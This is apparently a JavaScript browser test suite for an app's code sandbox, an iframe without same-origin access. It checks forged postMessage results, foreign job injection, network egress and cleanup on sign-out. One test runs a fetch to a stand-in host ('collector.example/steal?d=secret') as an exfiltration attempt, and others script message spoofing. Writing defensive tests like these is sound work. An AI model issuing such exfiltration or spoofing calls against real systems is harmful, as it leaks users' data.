/* CODE RUNS WHERE IT CANNOT REACH THE ACCOUNT.  (AMV-AUD-001, AMV-AUD-015)

   Programs AMV runs for somebody - code the model wrote, possibly steered by a
   page it read - now run in src/sandbox/sandbox.js, framed as
   <iframe sandbox="allow-scripts"> with no allow-same-origin. security.test
   checks what a program can reach from inside; this checks the channel between
   the app and the frame, because an isolated sandbox with a forgeable channel
   is not isolated:
     · a result is only accepted from the sandbox frame - a forged one from
       another window, with the right job id, is ignored;
     · the sandbox only takes work from the window that framed it;
     · signing out removes the frame, and everything running in it;
     · a sandbox that cannot load says so, instead of hanging a run for ever. */
import { bootApp } from '../lib/harness.mjs';
import { ok, section, report, done } from '../lib/assert.mjs';

const app = await bootApp({ tab: 'chat' });
const { page, errors } = app;

section('A program runs, in the frame');
{
  const r = await page.evaluate(() => runCode('console.log("hi"); return 6 * 7;', 'js'));
  ok(r.ok === true && r.stdout === 'hi' && r.result === '42', 'an ordinary program runs and answers', r);
  const f = await page.evaluate(() => { const el = document.querySelector('iframe.amv-sbx'); return el ? { sandbox: el.getAttribute('sandbox'), src: el.getAttribute('src') } : null; });
  ok(f && f.sandbox === 'allow-scripts' && f.src === '/sandbox.html', 'in the sandbox frame, without allow-same-origin', f);
}

/* Another frame on the page - an ad, an embed, anything. Its script must run IN
   that frame for the browser to attribute its messages to it: a postMessage
   called from the page's own script is the page's message, whatever window it
   was looked up on - which is how the first version of this suite "sent" an
   intrusion that the sandbox, correctly, saw as coming from its parent. */
async function otherFrame() {
  await page.evaluate(() => {
    const o = document.createElement('iframe');
    o.id = 'someone-else'; o.src = 'about:blank';
    document.body.appendChild(o);
  });
  const h = await page.waitForSelector('#someone-else', { state: 'attached' });
  return await h.contentFrame();
}

section('A forged result from another window is ignored');
{
  const job = page.evaluate(() => runCode('const t = Date.now(); while (Date.now() - t < 800) {} return "the real answer";', 'js'));
  await page.waitForTimeout(150);
  const id = await page.evaluate(() => [..._SBX.pending.keys()][0]);
  const other = await otherFrame();
  ok(!!id && !!other, 'a job is in flight, and another frame is on the page', { id, other: !!other });
  if (other) await other.evaluate((jid) => { parent.postMessage({ t: 'result', id: jid, ok: true, stdout: 'FORGED', result: 'FORGED' }, '*'); }, id);
  const out = await job;
  ok(out.result === 'the real answer' && out.stdout !== 'FORGED', 'the answer is the program’s, not the forger’s', out);
  await page.evaluate(() => document.getElementById('someone-else')?.remove());
}

section('The sandbox only takes work from the window that framed it');
{
  await page.evaluate(() => {
    window.__intruderSeen = [];
    window.addEventListener('message', (ev) => { if (ev.data && ev.data.id === 'intruder1') window.__intruderSeen.push(ev.data); });
  });
  const other = await otherFrame();
  if (other) await other.evaluate(() => {
    const sbx = parent.document.querySelector('iframe.amv-sbx');
    sbx.contentWindow.postMessage({ t: 'run', id: 'intruder1', lang: 'js', code: 'return 1', timeoutMs: 2000 }, '*');
  });
  await page.waitForTimeout(1500);
  const seen = await page.evaluate(() => window.__intruderSeen);
  ok(!!other && seen.length === 0, 'a job from another window is never run or answered', seen);
  await page.evaluate(() => document.getElementById('someone-else')?.remove());
}

section('A program cannot send anything anywhere');
{
  /* An address that ANSWERS, with CORS open, and counts every request that
     reaches it. The first version of this check fetched '/', which inside a
     worker made from a blob URL is not even a valid address - it failed
     whatever the policy said, and it passed with the network wide open. A
     request is measured by whether it ARRIVED. */
  let hits = 0;
  await page.context().route('https://collector.example/**', (route) => {
    hits++;
    route.fulfill({ status: 200, body: 'got it', headers: { 'Access-Control-Allow-Origin': '*' } });
  });
  const r = await page.evaluate(() => runCode(`
    try { const res = await fetch('https://collector.example/steal?d=secret'); return 'REACHED ' + res.status; }
    catch (e) { return 'refused'; }`, 'js'));
  await page.waitForTimeout(300);
  ok(r.result === 'refused', 'the program is refused', r);
  ok(hits === 0, 'and nothing arrived at the other end', hits);
  await page.context().unroute('https://collector.example/**');
}

section('Signing out removes the frame and what was running in it');
{
  const r = await page.evaluate(async () => {
    const running = runCode('const t = Date.now(); while (Date.now() - t < 5000) {} return "finished";', 'js');
    await new Promise(res => setTimeout(res, 200));
    const before = !!document.querySelector('iframe.amv-sbx');
    _wipeAccountState();
    const out = await running;
    return { before, after: !!document.querySelector('iframe.amv-sbx'), out };
  });
  ok(r.before && !r.after, 'the frame is gone after sign-out', r);
  ok(r.out.ok === false && /signed out/.test(r.out.stderr), 'and the program running in it was stopped, and said so', r.out);
  const again = await page.evaluate(() => runCode('return "fresh"', 'js'));
  ok(again.ok === true && again.result === 'fresh', 'the next run starts a fresh sandbox', again);
}

section('A sandbox that cannot load says so');
{
  await page.evaluate(() => _sbxDestroy('test reset'));
  await page.context().route('**/sandbox.html', r => r.abort());
  const t0 = Date.now();
  const r = await page.evaluate(() => runCode('return 1', 'js'));
  const ms = Date.now() - t0;
  await page.context().unroute('**/sandbox.html');
  ok(r.ok === false && /could not start/.test(r.stderr), 'the run fails with a sentence, not a hang', r);
  ok(ms < 20000, 'within the start limit', ms);
  ok(!(await page.evaluate(() => document.querySelector('iframe.amv-sbx'))), 'and the dead frame is not left behind', true);
}

section('Nothing threw');
ok(errors.length === 0, 'zero uncaught page errors', JSON.stringify(errors.slice(0, 3)));

await app.close();
report();
done();
